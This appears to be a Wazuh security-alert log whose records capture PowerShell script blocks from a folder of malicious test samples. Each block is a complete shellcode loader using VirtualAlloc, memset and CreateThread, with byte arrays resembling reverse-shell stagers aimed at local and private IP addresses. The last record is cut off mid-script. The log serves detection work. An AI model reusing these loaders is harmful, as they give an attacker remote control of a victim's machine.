{"timestamp":"2026-07-06T02:19:17.067+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":88,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304357.2554055","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:37.2566380Z","eventRecordID":"145091","processID":"8188","threadID":"4284","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x7f,0x00,0x00,0x01,0x68,0x02,0x00,0x02,0x99,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 4aaf8aff-e023-44f9-a456-e9cb993bef0f\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1975.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x7f,0x00,0x00,0x01,0x68,0x02,0x00,0x02,0x99,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"4aaf8aff-e023-44f9-a456-e9cb993bef0f","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1975.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:18.246+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":89,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304358.2565004","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:38.1707158Z","eventRecordID":"145095","processID":"1448","threadID":"5444","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$Ue1 = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Ue1 -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xdb,0xd9,0x74,0x24,0xf4,0xba,0xa8,0x51,0x16,0x94,0x5e,0x31,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x14,0x03,0x56,0xbc,0xb3,0xe3,0x68,0x54,0xb1,0x0c,0x91,0xa4,0xd6,0x85,0x74,0x95,0xd6,0xf2,0xfd,0x85,0xe6,0x71,0x53,0x29,0x8c,0xd4,0x40,0xba,0xe0,0xf0,0x67,0x0b,0x4e,0x27,0x49,0x8c,0xe3,0x1b,0xc8,0x0e,0xfe,0x4f,0x2a,0x2f,0x31,0x82,0x2b,0x68,0x2c,0x6f,0x79,0x21,0x3a,0xc2,0x6e,0x46,0x76,0xdf,0x05,0x14,0x96,0x67,0xf9,0xec,0x99,0x46,0xac,0x67,0xc0,0x48,0x4e,0xa4,0x78,0xc1,0x48,0xa9,0x45,0x9b,0xe3,0x19,0x31,0x1a,0x22,0x50,0xba,0xb1,0x0b,0x5d,0x49,0xcb,0x4c,0x59,0xb2,0xbe,0xa4,0x9a,0x4f,0xb9,0x72,0xe1,0x8b,0x4c,0x61,0x41,0x5f,0xf6,0x4d,0x70,0x8c,0x61,0x05,0x7e,0x79,0xe5,0x41,0x62,0x7c,0x2a,0xfa,0x9e,0xf5,0xcd,0x2d,0x17,0x4d,0xea,0xe9,0x7c,0x15,0x93,0xa8,0xd8,0xf8,0xac,0xab,0x83,0xa5,0x08,0xa7,0x29,0xb1,0x20,0xea,0x25,0x76,0x09,0x15,0xb5,0x10,0x1a,0x66,0x87,0xbf,0xb0,0xe0,0xab,0x48,0x1f,0xf6,0xcc,0x62,0xe7,0x68,0x33,0x8d,0x18,0xa0,0xf7,0xd9,0x48,0xda,0xde,0x61,0x03,0x1a,0xdf,0xb7,0xbe,0x1f,0x77,0x61,0x1a,0xe5,0x55,0xf9,0x66,0xe5,0x48,0xa7,0xef,0x03,0x3a,0x07,0xa0,0x9b,0xfa,0xf7,0x00,0x4c,0x92,0x1d,0x8f,0xb3,0x82,0x1d,0x45,0xdc,0x28,0xf2,0x30,0xb4,0xc4,0x6b,0x19,0x4e,0x75,0x73,0xb7,0x2a,0xb5,0xff,0x34,0xca,0x7b,0x08,0x30,0xd8,0xeb,0xf8,0x0f,0x82,0xbd,0x07,0xba,0xa9,0x41,0x92,0x41,0x78,0x16,0x0a,0x48,0x5d,0x50,0x95,0xb3,0x88,0xeb,0x1c,0x26,0x73,0x83,0x60,0xa6,0x73,0x53,0x37,0xac,0x73,0x3b,0xef,0x94,0x27,0x5e,0xf0,0x00,0x54,0xf3,0x65,0xab,0x0d,0xa0,0x2e,0xc3,0xb3,0x9f,0x19,0x4c,0x4b,0xca,0x9b,0xb0,0x9a,0x32,0xee,0xd8,0x1e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$72X=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($72X.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$72X,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 97906606-29f1-4df0-8e3b-6bb7e82b0784\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1985.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$Ue1 = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Ue1 -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xdb,0xd9,0x74,0x24,0xf4,0xba,0xa8,0x51,0x16,0x94,0x5e,0x31,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x14,0x03,0x56,0xbc,0xb3,0xe3,0x68,0x54,0xb1,0x0c,0x91,0xa4,0xd6,0x85,0x74,0x95,0xd6,0xf2,0xfd,0x85,0xe6,0x71,0x53,0x29,0x8c,0xd4,0x40,0xba,0xe0,0xf0,0x67,0x0b,0x4e,0x27,0x49,0x8c,0xe3,0x1b,0xc8,0x0e,0xfe,0x4f,0x2a,0x2f,0x31,0x82,0x2b,0x68,0x2c,0x6f,0x79,0x21,0x3a,0xc2,0x6e,0x46,0x76,0xdf,0x05,0x14,0x96,0x67,0xf9,0xec,0x99,0x46,0xac,0x67,0xc0,0x48,0x4e,0xa4,0x78,0xc1,0x48,0xa9,0x45,0x9b,0xe3,0x19,0x31,0x1a,0x22,0x50,0xba,0xb1,0x0b,0x5d,0x49,0xcb,0x4c,0x59,0xb2,0xbe,0xa4,0x9a,0x4f,0xb9,0x72,0xe1,0x8b,0x4c,0x61,0x41,0x5f,0xf6,0x4d,0x70,0x8c,0x61,0x05,0x7e,0x79,0xe5,0x41,0x62,0x7c,0x2a,0xfa,0x9e,0xf5,0xcd,0x2d,0x17,0x4d,0xea,0xe9,0x7c,0x15,0x93,0xa8,0xd8,0xf8,0xac,0xab,0x83,0xa5,0x08,0xa7,0x29,0xb1,0x20,0xea,0x25,0x76,0x09,0x15,0xb5,0x10,0x1a,0x66,0x87,0xbf,0xb0,0xe0,0xab,0x48,0x1f,0xf6,0xcc,0x62,0xe7,0x68,0x33,0x8d,0x18,0xa0,0xf7,0xd9,0x48,0xda,0xde,0x61,0x03,0x1a,0xdf,0xb7,0xbe,0x1f,0x77,0x61,0x1a,0xe5,0x55,0xf9,0x66,0xe5,0x48,0xa7,0xef,0x03,0x3a,0x07,0xa0,0x9b,0xfa,0xf7,0x00,0x4c,0x92,0x1d,0x8f,0xb3,0x82,0x1d,0x45,0xdc,0x28,0xf2,0x30,0xb4,0xc4,0x6b,0x19,0x4e,0x75,0x73,0xb7,0x2a,0xb5,0xff,0x34,0xca,0x7b,0x08,0x30,0xd8,0xeb,0xf8,0x0f,0x82,0xbd,0x07,0xba,0xa9,0x41,0x92,0x41,0x78,0x16,0x0a,0x48,0x5d,0x50,0x95,0xb3,0x88,0xeb,0x1c,0x26,0x73,0x83,0x60,0xa6,0x73,0x53,0x37,0xac,0x73,0x3b,0xef,0x94,0x27,0x5e,0xf0,0x00,0x54,0xf3,0x65,0xab,0x0d,0xa0,0x2e,0xc3,0xb3,0x9f,0x19,0x4c,0x4b,0xca,0x9b,0xb0,0x9a,0x32,0xee,0xd8,0x1e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$72X=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($72X.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$72X,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"97906606-29f1-4df0-8e3b-6bb7e82b0784","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1985.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:19.202+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":90,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304359.2576353","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:38.9587173Z","eventRecordID":"145099","processID":"8428","threadID":"3740","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xf0,0xd7,0xc7,0xa7,0xda,0xd6,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,0x47,0x31,0x50,0x13,0x83,0xe8,0xfc,0x03,0x50,0xff,0x35,0x32,0x5b,0x17,0x3b,0xbd,0xa4,0xe7,0x5c,0x37,0x41,0xd6,0x5c,0x23,0x01,0x48,0x6d,0x27,0x47,0x64,0x06,0x65,0x7c,0xff,0x6a,0xa2,0x73,0x48,0xc0,0x94,0xba,0x49,0x79,0xe4,0xdd,0xc9,0x80,0x39,0x3e,0xf0,0x4a,0x4c,0x3f,0x35,0xb6,0xbd,0x6d,0xee,0xbc,0x10,0x82,0x9b,0x89,0xa8,0x29,0xd7,0x1c,0xa9,0xce,0xaf,0x1f,0x98,0x40,0xa4,0x79,0x3a,0x62,0x69,0xf2,0x73,0x7c,0x6e,0x3f,0xcd,0xf7,0x44,0xcb,0xcc,0xd1,0x95,0x34,0x62,0x1c,0x1a,0xc7,0x7a,0x58,0x9c,0x38,0x09,0x90,0xdf,0xc5,0x0a,0x67,0xa2,0x11,0x9e,0x7c,0x04,0xd1,0x38,0x59,0xb5,0x36,0xde,0x2a,0xb9,0xf3,0x94,0x75,0xdd,0x02,0x78,0x0e,0xd9,0x8f,0x7f,0xc1,0x68,0xcb,0x5b,0xc5,0x31,0x8f,0xc2,0x5c,0x9f,0x7e,0xfa,0xbf,0x40,0xde,0x5e,0xcb,0x6c,0x0b,0xd3,0x96,0xf8,0xf8,0xde,0x28,0xf8,0x96,0x69,0x5a,0xca,0x39,0xc2,0xf4,0x66,0xb1,0xcc,0x03,0x89,0xe8,0xa9,0x9c,0x74,0x13,0xca,0xb5,0xb2,0x47,0x9a,0xad,0x13,0xe8,0x71,0x2e,0x9c,0x3d,0xef,0x2b,0x0a,0x00,0x70,0xf9,0x5c,0x14,0x73,0xfe,0x7f,0x7f,0xfa,0x18,0x2f,0x2f,0xad,0xb4,0x8f,0x9f,0x0d,0x65,0x67,0xca,0x81,0x5a,0x97,0xf5,0x4b,0xf3,0x3d,0x1a,0x22,0xab,0xa9,0x83,0x6f,0x27,0x48,0x4b,0xba,0x4d,0x4a,0xc7,0x49,0xb1,0x04,0x20,0x27,0xa1,0xf0,0xc0,0x72,0x9b,0x56,0xde,0xa8,0xb6,0x56,0x4a,0x57,0x11,0x01,0xe2,0x55,0x44,0x65,0xad,0xa6,0xa3,0xfe,0x64,0x33,0x0c,0x68,0x89,0xd3,0x8c,0x68,0xdf,0xb9,0x8c,0x00,0x87,0x99,0xde,0x35,0xc8,0x37,0x73,0xe6,0x5d,0xb8,0x22,0x5b,0xf5,0xd0,0xc8,0x82,0x31,0x7f,0x32,0xe1,0xc3,0x43,0xe5,0xcf,0xb1,0xad,0x35;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 38a62803-6b9a-45e9-b68d-8a910eb256e4\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\199.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xf0,0xd7,0xc7,0xa7,0xda,0xd6,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,0x47,0x31,0x50,0x13,0x83,0xe8,0xfc,0x03,0x50,0xff,0x35,0x32,0x5b,0x17,0x3b,0xbd,0xa4,0xe7,0x5c,0x37,0x41,0xd6,0x5c,0x23,0x01,0x48,0x6d,0x27,0x47,0x64,0x06,0x65,0x7c,0xff,0x6a,0xa2,0x73,0x48,0xc0,0x94,0xba,0x49,0x79,0xe4,0xdd,0xc9,0x80,0x39,0x3e,0xf0,0x4a,0x4c,0x3f,0x35,0xb6,0xbd,0x6d,0xee,0xbc,0x10,0x82,0x9b,0x89,0xa8,0x29,0xd7,0x1c,0xa9,0xce,0xaf,0x1f,0x98,0x40,0xa4,0x79,0x3a,0x62,0x69,0xf2,0x73,0x7c,0x6e,0x3f,0xcd,0xf7,0x44,0xcb,0xcc,0xd1,0x95,0x34,0x62,0x1c,0x1a,0xc7,0x7a,0x58,0x9c,0x38,0x09,0x90,0xdf,0xc5,0x0a,0x67,0xa2,0x11,0x9e,0x7c,0x04,0xd1,0x38,0x59,0xb5,0x36,0xde,0x2a,0xb9,0xf3,0x94,0x75,0xdd,0x02,0x78,0x0e,0xd9,0x8f,0x7f,0xc1,0x68,0xcb,0x5b,0xc5,0x31,0x8f,0xc2,0x5c,0x9f,0x7e,0xfa,0xbf,0x40,0xde,0x5e,0xcb,0x6c,0x0b,0xd3,0x96,0xf8,0xf8,0xde,0x28,0xf8,0x96,0x69,0x5a,0xca,0x39,0xc2,0xf4,0x66,0xb1,0xcc,0x03,0x89,0xe8,0xa9,0x9c,0x74,0x13,0xca,0xb5,0xb2,0x47,0x9a,0xad,0x13,0xe8,0x71,0x2e,0x9c,0x3d,0xef,0x2b,0x0a,0x00,0x70,0xf9,0x5c,0x14,0x73,0xfe,0x7f,0x7f,0xfa,0x18,0x2f,0x2f,0xad,0xb4,0x8f,0x9f,0x0d,0x65,0x67,0xca,0x81,0x5a,0x97,0xf5,0x4b,0xf3,0x3d,0x1a,0x22,0xab,0xa9,0x83,0x6f,0x27,0x48,0x4b,0xba,0x4d,0x4a,0xc7,0x49,0xb1,0x04,0x20,0x27,0xa1,0xf0,0xc0,0x72,0x9b,0x56,0xde,0xa8,0xb6,0x56,0x4a,0x57,0x11,0x01,0xe2,0x55,0x44,0x65,0xad,0xa6,0xa3,0xfe,0x64,0x33,0x0c,0x68,0x89,0xd3,0x8c,0x68,0xdf,0xb9,0x8c,0x00,0x87,0x99,0xde,0x35,0xc8,0x37,0x73,0xe6,0x5d,0xb8,0x22,0x5b,0xf5,0xd0,0xc8,0x82,0x31,0x7f,0x32,0xe1,0xc3,0x43,0xe5,0xcf,0xb1,0xad,0x35;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"38a62803-6b9a-45e9-b68d-8a910eb256e4","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\199.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:19.216+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":91,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304359.2587658","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:39.8876450Z","eventRecordID":"145103","processID":"4048","threadID":"3900","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xd1,0x85,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 